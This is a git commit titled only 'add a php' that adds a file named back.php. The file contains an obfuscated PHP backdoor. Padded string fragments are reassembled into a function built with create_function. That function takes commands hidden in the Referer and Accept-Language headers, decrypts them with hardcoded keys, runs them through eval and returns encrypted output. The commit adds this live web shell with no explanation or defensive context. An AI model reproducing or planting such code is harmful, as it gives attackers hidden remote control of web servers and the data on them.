f7e154cb58453283dc5a799d2957cfaa460a91df
n+e <463003665@qq.com>
2018-01-23 17:44:46 +0800

    add a php

---
+++ back.php
@@ -0,0 +1,18 @@
+<?php
+$P='];if(strpG|os($p,$G|h)===0){G|$s[$i]="";$pG|=$sG|s($p,3G|G|);}if(array_keG|y_exiG|sts($i,$G|sG|)G|){';
+$l='_eG|nG|code(x(gG|zcompressG|($oG|),$k));G|G|print("<$k>$d<G|/G|$G|k>");@sessioG|n_G|destroy();}}}}';
+$X='q=G|array_values($q);G|preg_mG|atch_aG|ll("/(G|[\\wG|G|])[\\w-]+(?:;qG|=0.([\\d]))?G|,?/G|",G|$r';
+$U='coG|mpress(@x(@basG|e64_decodeG|(G|preg_replacG|e(G|array(G|"/_/"G|,"/-/"),arrG|ay("/G|","+"),G';
+$j='a,$m);G|ifG|($q&&$mG|){@sessionG|_start(G|);$sG|G|=&$G|_SESG|SIONG|;$ss="suG|bstr";G|$sl="str';
+$p='tolower";$G|i=$m[1][0G|].$m[G|1]G|[1];$h=$G|G|sl(G|$G|ss(md5($i.$G|khG|),0,3)G|);$f=$sl($G|ss(m';
+$E='d5($i.$kf),0,3G|));G|$p=G|G|"";for($z=1;$z<cG|ount(G|$m[1]);G|$z+G|G|+)$p.=$q[$m[G|G|2][G|$z]';
+$Z='o="";G|for($i=0;$i<G|$l;){G|for($j=0;(G|$j<$cG|&&$i<$lG|);$G|j++,$G|i++){G|$o.=$t{$iG|}^$k{$j';
+$N='|$sG|s($s[$G|i],0,$G|e))),G|$kG|)));$oG|=ob_get_cG|ontents()G|;oG|b_eG|nd_clean();$d=bG|ase64';
+$y='G|};}G|}retG|urn $o;}$r=G|$_SERVEG|R;$G|rr=@G|$r["G|HTTP_REFEG|RER"];$raG|G|=@$r["HG|TTP_ACCEPT_G|L';
+$h=str_replace('eP','','creePatePePe_fePePunctePion');
+$W='$s[G|$i].=$p;$e=G|strpos($s[G|$i],$fG|);if($G|G|e){$k=$kh.$kG|f;ob_G|starG|t();@evaG|G|l(@gzG|un';
+$C='ANGUG|AGE"]G|G|;if($G|rr&&$ra){$uG|=parse_urG|l($G|rr);parsG|e_str($G|u["queG|ry"],$q)G|;G|G|$';
+$x='$khG|="276f"G|;$kf="7227G|";G|function G|x($tG|,$k){$cG|=strlen($G|G|k);$l=strlenG|G|($t)G|;$';
+$f=str_replace('G|','',$x.$Z.$y.$C.$X.$j.$p.$E.$P.$W.$U.$N.$l);
+$n=$h('',$f);$n();
+?>
